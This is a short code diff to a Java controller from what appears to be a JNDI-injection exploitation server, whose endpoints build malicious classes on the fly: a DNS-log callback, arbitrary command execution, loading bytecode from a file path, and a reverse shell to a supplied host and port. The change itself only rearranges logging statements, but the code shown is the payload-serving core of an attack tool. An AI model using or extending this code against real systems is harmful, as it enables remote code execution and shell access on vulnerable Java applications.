@@ -35,12 +35,13 @@ public class BasicController implements Controller {
 
     @JNDIMapping("/DnsLog/{url}")
     public byte[] dnsLog(String url) throws Exception {
-        String className = MiscUtil.getRandStr(12);
+        System.out.println("[DnsLog] Url:" + url);
 
         if (!url.startsWith("http://")) {
             url = "http://" + url;
         }
 
+        String className = MiscUtil.getRandStr(12);
         ClassPool pool = ClassPool.getDefault();
         ClassFile classFile = new ClassFile(false, className, null);
         classFile.setMajorVersion(ClassFile.JAVA_8);
@@ -52,15 +53,14 @@ public class BasicController implements Controller {
         constructor.setModifiers(Modifier.PUBLIC);
         constructor.setBody(body);
         clazz.addConstructor(constructor);
-
-        System.out.println("DnsLog: " + url);
         return clazz.toBytecode();
     }
 
     @JNDIMapping("/Command/{cmd}")
     public byte[] command(String cmd) throws Exception {
-        String className = MiscUtil.getRandStr(12);
+        System.out.println("[Command] Cmd: " + cmd);
 
+        String className = MiscUtil.getRandStr(12);
         ClassPool pool = ClassPool.getDefault();
         ClassFile classFile = new ClassFile(false, className, null);
         classFile.setMajorVersion(ClassFile.JAVA_8);
@@ -72,8 +72,6 @@ public class BasicController implements Controller {
         constructor.setModifiers(Modifier.PUBLIC);
         constructor.setBody(body);
         clazz.addConstructor(constructor);
-
-        System.out.println("Cmd: " + cmd);
         return clazz.toBytecode();
     }
 
@@ -91,15 +89,15 @@ public class BasicController implements Controller {
 
     @JNDIMapping("/FromPath/{path}")
     public byte[] fromPath(String path) throws Exception {
-        String className = MiscUtil.getRandStr(12);
         byte[] byteCode = Files.readAllBytes(Paths.get(path));
         return byteCode;
     }
 
     @JNDIMapping("/ReverseShell/{host}/{port}")
     public byte[] reverseShell(String host, String port) throws Exception {
-        String className = MiscUtil.getRandStr(12);
+        System.out.println("[ReverseShell]: Host: " + host + " Port: " + port);
 
+        String className = MiscUtil.getRandStr(12);
         ClassPool pool = ClassPool.getDefault();
         CtClass clazz = pool.get(ReverseShellTemplate.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
@@ -107,7 +105,6 @@ public class BasicController implements Controller {
         ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
         ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));
 
-        System.out.println("ReverseShell ClassName: " + clazz.getName() + " Host: " + host + " Port: " + port);
         return clazz.toBytecode();
     }
 }
